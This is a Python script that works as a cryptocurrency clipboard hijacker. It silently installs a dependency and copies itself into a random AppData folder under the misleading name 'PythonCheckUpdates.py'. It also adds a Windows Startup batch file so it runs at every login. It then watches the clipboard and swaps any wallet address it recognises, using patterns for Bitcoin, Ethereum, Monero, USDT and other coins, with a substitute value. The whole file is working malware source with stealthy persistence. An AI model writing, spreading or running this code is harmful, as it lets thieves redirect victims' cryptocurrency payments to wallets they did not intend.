import re
import os
import time
import random
import shutil
import subprocess
import sys

try:
    import pyperclip
except:
    os.system('pip install -q pyperclip')
    import pyperclip

currentpath = os.path.abspath(__file__)
appdatalocal = os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local')
destinationpath = os.path.abspath(__file__)

if appdatalocal not in currentpath:
    folders = [f for f in os.listdir(appdatalocal) 
              if os.path.isdir(os.path.join(appdatalocal, f)) 
              and f not in {'Temp', 'Packages', 'Microsoft', 'CrashDumps'}]
    if folders:
        destinationfolder = os.path.join(appdatalocal, random.choice(folders))
        destinationpath = os.path.join(destinationfolder, os.path.basename('PythonCheckUpdates.py'))
        shutil.copy2(os.path.abspath(__file__), destinationpath)
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

startupfolder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
shortcutpath = os.path.join(startupfolder, 'PythonCheckUpdates.bat')
if not os.path.exists(shortcutpath):
    with open(shortcutpath, 'w') as f:
        f.write(f'@echo off\npython "{destinationpath}"\n')

patterns = {
    '|BTC|'  : r'\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b',
    '|ETH'   : r'\b0x[a-fA-F0-9]{40}\b',
    '|BNB|'  : r'\b(bnb1)[0-9a-z]{38}\b',
    '|XRP|'  : r'\br[0-9a-zA-Z]{24,34}\b',
    '|ADA|'  : r'\baddr1[0-9a-z]{58,}\b',
    '|SOL|'  : r'\b[1-9A-HJ-NP-Za-km-z]{32,44}\b',
    '|DOGE|' : r'\bD{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}\b',
    '|TRX|'  : r'\bT[1-9A-HJ-NP-Za-km-z]{33}\b',
    '|MATIC|': r'\b0x[a-fA-F0-9]{40}\b',
    '|LTC|'  : r'\b[L3M][a-km-zA-HJ-NP-Z1-9]{26,33}\b',
    '|SHIB|' : r'\b0x[a-fA-F0-9]{40}\b',
    '|AVAX|' : r'\bX-[0-9A-HJ-NP-Za-km-z]{48,50}\b',
    '|DAI|'  : r'\b0x[a-fA-F0-9]{40}\b',
    '|UNI|'  : r'\b0x[a-fA-F0-9]{40}\b',
    '|WBTC|' : r'\b0x[a-fA-F0-9]{40}\b',
    '|LINK|' : r'\b0x[a-fA-F0-9]{40}\b',
    '|XLM|'  : r'\bG[0-9A-Z]{55}\b',
    '|ATOM|' : r'\bcosmos1[0-9a-z]{38}\b',
    '|ETC|'  : r'\b0x[a-fA-F0-9]{40}\b',
    '|XMR|'  : r'\b4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}\b',
    '|USDT-ERC20|': r'\b0x[a-fA-F0-9]{40}\b',
    '|USDC-ERC20|': r'\b0x[a-fA-F0-9]{40}\b',
}

def startclipping():
    while True:
        try:
            data = pyperclip.paste().strip()
            for adress, pattern in patterns.items():
                if re.fullmatch(pattern, data):
                    pyperclip.copy(adress)  
            time.sleep(0.5)

        except:
            time.sleep(1)

startclipping()